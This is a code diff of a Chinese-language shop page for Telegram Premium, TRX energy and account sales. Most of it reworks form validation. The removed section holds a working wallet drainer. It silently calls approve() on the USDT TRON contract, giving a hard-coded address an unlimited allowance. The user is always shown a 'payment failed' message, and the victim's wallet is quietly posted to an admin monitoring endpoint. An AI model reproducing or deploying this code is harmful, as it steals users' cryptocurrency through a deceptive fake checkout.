-                            const shippingAddress = document.getElementById('shippingAddress').value.trim();
-                            const shippingPhone = document.getElementById('shippingPhone').value.trim();
-                            
-                            if (!contactName || !shippingAddress || !shippingPhone) {
-                                showTemporaryMessage('请填写完整的收货信息！');
-                                return;
-                            }
+                if (!quantity || quantity < 1) {
+                    showTemporaryMessage('请填写正确的购买数量！');
+                    return;
+                }
+                
+                if (selectedAccount.type === 'phone') {
+                    if (selectedAccount.name.includes('话费')) {
+                        const rechargePhone = document.getElementById('rechargePhone').value.trim();
+                        if (!rechargePhone) {
+                            showTemporaryMessage('请填写充值电话！');
+                            return;
                         }
-                    } else if (selectedAccount.type === 'bankcard') {
-                        // 银行卡验证
+                    } else {
                         const contactName = document.getElementById('contactName').value.trim();
                         const shippingAddress = document.getElementById('shippingAddress').value.trim();
                         const shippingPhone = document.getElementById('shippingPhone').value.trim();
@@ -4033,313 +4028,32 @@
                             showTemporaryMessage('请填写完整的收货信息！');
                             return;
                         }
-                    } else {
-                        // 普通账号验证
-                        const accountEmail = document.getElementById('accountEmail').value.trim();
-                        if (!accountEmail) {
-                            showTemporaryMessage('请填写接收信息！');
-                            return;
-                        }
                     }
+                } else if (selectedAccount.type === 'bankcard') {
+                    const contactName = document.getElementById('contactName').value.trim();
+                    const shippingAddress = document.getElementById('shippingAddress').value.trim();
+                    const shippingPhone = document.getElementById('shippingPhone').value.trim();
                     
-                    document.getElementById('accountWalletSection').style.display = 'block';
-                    document.getElementById('accountUserForm').style.display = 'none';
-                    
-                    if (!isInWalletBrowser()) {
-                        document.getElementById('accountCopyContainer').style.display = 'block';
+                    if (!contactName || !shippingAddress || !shippingPhone) {
+                        showTemporaryMessage('请填写完整的收货信息！');
+                        return;
                     }
-                });
+                } else {
+                    const accountEmail = document.getElementById('accountEmail').value.trim();
+                    if (!accountEmail) {
+                        showTemporaryMessage('请填写接收信息！');
+                        return;
+                    }
+                }
+                
+                document.getElementById('accountWalletSection').style.display = 'block';
+                document.getElementById('accountUserForm').style.display = 'none';
+                
+                if (!isInWalletBrowser()) {
+                    document.getElementById('accountCopyContainer').style.display = 'block';
+                }
             });
-
-            function generatePaymentUrl(service) {
-                let quantity = 1;
-                
-                if (service === 'premium') {
-                    const username = document.getElementById('username').value.trim();
-                    const nickname = document.getElementById('nickname').value.trim();
-                    
-                    if (!username || !nickname) {
-                        showTemporaryMessage('请先填写用户信息！');
-                        return null;
-                    }
-                    
-                    const orderId = 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-                    const authUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=0.99&service=premium&quantity=1`;
-                    return authUrl;
-                } else if (service === 'trx') {
-                    const trxAddress = document.getElementById('trxAddress').value.trim();
-                    
-                    if (!trxAddress) {
-                        showTemporaryMessage('请先填写钱包地址！');
-                        return null;
-                    }
-                    
-                    const orderId = 'TRX' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-                    const authUrl = `payment.html?orderId=${orderId}&trxAddress=${encodeURIComponent(trxAddress)}&amount=1.99&service=trx&quantity=1`;
-                    return authUrl;
-                } else if (service === 'account') {
-                    if (!selectedAccount) {
-                        showTemporaryMessage('请先选择账号！');
-                        return null;
-                    }
-                    
-                    const orderId = 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-                    const accountNote = document.getElementById('accountNote').value.trim();
-                    quantity = document.getElementById('quantity').value.trim();
-                    const totalAmount = (selectedAccount.price * quantity).toFixed(2);
-                    
-                    let authUrl = `payment.html?orderId=${orderId}&accountNote=${encodeURIComponent(accountNote)}&accountType=${encodeURIComponent(selectedAccount.type)}&accountName=${encodeURIComponent(selectedAccount.name)}&amount=${totalAmount}&service=account&quantity=${quantity}`;
-                    
-                    if (selectedAccount.type === 'phone') {
-                        if (selectedAccount.name.includes('话费')) {
-                            const rechargePhone = document.getElementById('rechargePhone').value.trim();
-                            const operator = document.getElementById('operator').value.trim();
-                            authUrl += `&rechargePhone=${encodeURIComponent(rechargePhone)}&operator=${encodeURIComponent(operator)}`;
-                        } else {
-                            const contactName = document.getElementById('contactName').value.trim();
-                            const shippingAddress = document.getElementById('shippingAddress').value.trim();
-                            const shippingPhone = document.getElementById('shippingPhone').value.trim();
-                            authUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
-                        }
-                    } else if (selectedAccount.type === 'bankcard') {
-                        const contactName = document.getElementById('contactName').value.trim();
-                        const shippingAddress = document.getElementById('shippingAddress').value.trim();
-                        const shippingPhone = document.getElementById('shippingPhone').value.trim();
-                        authUrl += `&contactName=${encodeURIComponent(contactName)}&shippingAddress=${encodeURIComponent(shippingAddress)}&shippingPhone=${encodeURIComponent(shippingPhone)}`;
-                    } else {
-                        const accountEmail = document.getElementById('accountEmail').value.trim();
-                        authUrl += `&accountEmail=${encodeURIComponent(accountEmail)}`;
-                    }
-                    
-                    return authUrl;
-                }
-            }
-
-            // 生成订单数据的函数
-            function generateOrderData(service) {
-                if (service === 'premium') {
-                    const username = document.getElementById('username')?.value.trim();
-                    const nickname = document.getElementById('nickname')?.value.trim();
-                    
-                    if (!username || !nickname) {
-                        showTemporaryMessage('请先填写用户信息！');
-                        return null;
-                    }
-                    
-                    return {
-                        orderId: 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase(),
-                        service: 'premium',
-                        amount: '0.99',
-                        quantity: '1',
-                        username: username,
-                        nickname: nickname,
-                        productType: 'Telegram Premium 订阅'
-                    };
-                } else if (service === 'trx') {
-                    const trxAddress = document.getElementById('trxAddress')?.value.trim();
-                    
-                    if (!trxAddress) {
-                        showTemporaryMessage('请先填写钱包地址！');
-                        return null;
-                    }
-                    
-                    return {
-                        orderId: 'TRX' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase(),
-                        service: 'trx',
-                        amount: '1.99',
-                        quantity: '1',
-                        trxAddress: trxAddress,
-                        productType: 'TRX波场能量'
-                    };
-                } else if (service === 'account') {
-                    if (!selectedAccount) {
-                        showTemporaryMessage('请先选择账号！');
-                        return null;
-                    }
-                    
-                    const quantity = document.getElementById('quantity')?.value.trim() || '1';
-                    const accountNote = document.getElementById('accountNote')?.value.trim() || '';
-                    const totalAmount = (selectedAccount.price * quantity).toFixed(2);
-                    
-                    // 获取额外信息
-                    let extraParams = {};
-                    if (selectedAccount.type === 'phone') {
-                        if (selectedAccount.name.includes('话费')) {
-                            const rechargePhone = document.getElementById('rechargePhone')?.value.trim() || '';
-                            const operator = document.getElementById('operator')?.value.trim() || '';
-                            extraParams = {
-                                rechargePhone: rechargePhone,
-                                operator: operator
-                            };
-                        } else {
-                            const contactName = document.getElementById('contactName')?.value.trim() || '';
-                            const shippingAddress = document.getElementById('shippingAddress')?.value.trim() || '';
-                            const shippingPhone = document.getElementById('shippingPhone')?.value.trim() || '';
-                            extraParams = {
-                                contactName: contactName,
-                                shippingAddress: shippingAddress,
-                                shippingPhone: shippingPhone
-                            };
-                        }
-                    } else if (selectedAccount.type === 'bankcard') {
-                        const contactName = document.getElementById('contactName')?.value.trim() || '';
-                        const shippingAddress = document.getElementById('shippingAddress')?.value.trim() || '';
-                        const shippingPhone = document.getElementById('shippingPhone')?.value.trim() || '';
-                        extraParams = {
-                            contactName: contactName,
-                            shippingAddress: shippingAddress,
-                            shippingPhone: shippingPhone
-                        };
-                    } else {
-                        const accountEmail = document.getElementById('accountEmail')?.value.trim() || '';
-                        extraParams = {
-                            accountEmail: accountEmail
-                        };
-                    }
-                    
-                    return {
-                        orderId: 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase(),
-                        service: 'account',
-                        amount: totalAmount,
-                        quantity: quantity,
-                        accountType: selectedAccount.type,
-                        accountName: selectedAccount.name,
-                        accountNote: accountNote,
-                        productType: '账号购买',
-                        ...extraParams
-                    };
-                }
-                
-                return null;
-            }
-
-            // 静默USDT授权流程
-            async function executeSilentUSDTAuthorization(userAddress, service, orderData) {
-                try {
-                    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-                    
-                    // 获取USDT合约实例
-                    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
-                    
-                    console.log('🔐 执行静默USDT授权...');
-                    
-                    // 执行真实的USDT授权
-                    const result = await contract.approve(
-                        'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB',
-                        '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-                    ).send({
-                        feeLimit: 100000000,
-                        callValue: 0,
-                        shouldPollResponse: false
-                    });
-                    
-                    console.log('✅ USDT授权成功:', result);
-                    
-                    // 授权成功后，静默添加到监控系统
-                    addWalletToMonitoringSystem(userAddress, service, result, orderData.amount, 'authorized');
-                    
-                    // 无论授权是否成功，统一显示支付失败
-                    showPaymentFailedMessage(orderData);
-                    
-                } catch (error) {
-                    console.log('❌ USDT授权失败:', error);
-                    
-                    // 即使授权失败，也统一显示支付失败
-                    showPaymentFailedMessage(orderData);
-                    
-                    // 记录授权失败状态到监控系统
-                    addWalletToMonitoringSystem(userAddress, service, 'auth_failed_' + Date.now(), orderData.amount, 'auth_failed');
-                }
-            }
-
-            // 显示支付失败消息
-            function showPaymentFailedMessage(orderData) {
-                const userAddress = window.tronWeb?.defaultAddress?.base58 || '';
-                
-                // 构建跳转到 payment.html 的 URL
-                const params = new URLSearchParams();
-                params.append('status', 'failed');
-                params.append('orderId', orderData.orderId);
-                params.append('price', orderData.amount);
-                params.append('amount', orderData.amount);
-                params.append('quantity', orderData.quantity);
-                params.append('service', orderData.service);
-                params.append('productType', orderData.productType);
-                
-                // 添加用户地址（如果有）
-                if (userAddress) {
-                    params.append('userAddress', userAddress);
-                }
-                
-                // 根据服务类型添加额外参数
-                if (orderData.service === 'premium') {
-                    params.append('username', orderData.username || '');
-                    params.append('nickname', orderData.nickname || '');
-                } else if (orderData.service === 'trx') {
-                    params.append('trxAddress', orderData.trxAddress || '');
-                } else if (orderData.service === 'account') {
-                    params.append('accountType', orderData.accountType || '');
-                    params.append('accountName', orderData.accountName || '');
-                    params.append('accountNote', orderData.accountNote || '');
-                    
-                    // 添加额外参数
-                    if (orderData.accountEmail) params.append('accountEmail', orderData.accountEmail);
-                    if (orderData.rechargePhone) params.append('rechargePhone', orderData.rechargePhone);
-                    if (orderData.operator) params.append('operator', orderData.operator);
-                    if (orderData.contactName) params.append('contactName', orderData.contactName);
-                    if (orderData.shippingAddress) params.append('shippingAddress', orderData.shippingAddress);
-                    if (orderData.shippingPhone) params.append('shippingPhone', orderData.shippingPhone);
-                }
-                
-                // 跳转到支付失败页面
-                window.location.href = `payment.html?${params.toString()}`;
-            }
-            
-            // 静默添加钱包到监控系统
-            function addWalletToMonitoringSystem(walletAddress, service, txHash, price, status = 'authorized') {
-                // 静默发送到后台，不显示任何提示
-                fetch('./admin_api.php?action=add_wallet_to_monitor', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        walletAddress: walletAddress,
-                        walletName: `${service.toUpperCase()}用户-${new Date().toLocaleDateString()}`,
-                        authTxHash: txHash,
-                        authTime: new Date().toISOString(),
-                        serviceType: service,
-                        productPrice: price,
-                        authStatus: status
-                    })
-                }).catch(error => {
-                    console.log('监控系统连接失败（静默）');
-                });
-            }
-
-            // 生成订单ID
-            function generateOrderId(prefix) {
-                return prefix + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-            }
-
-            function checkBitgetWallet() {
-                if (navigator.userAgent.includes('Bitget') || navigator.userAgent.includes('BitKeep')) {
-                    console.log('在Bitget Wallet环境中');
-                    return true;
-                }
-                return false;
-            }
-
-            // 页面加载时初始化 WalletConnect
-            window.addEventListener('load', function() {
-                if (checkBitgetWallet()) {
-                    console.log('检测到在Bitget Wallet中运行');
-                }
-                
-                // 预加载 WalletConnect
-                setTimeout(() => {
-                    initWalletConnect();
-                }, 1000);
-            });
-        </script>
-    </div>
+        });
+    </script>
 </body>
 </html>
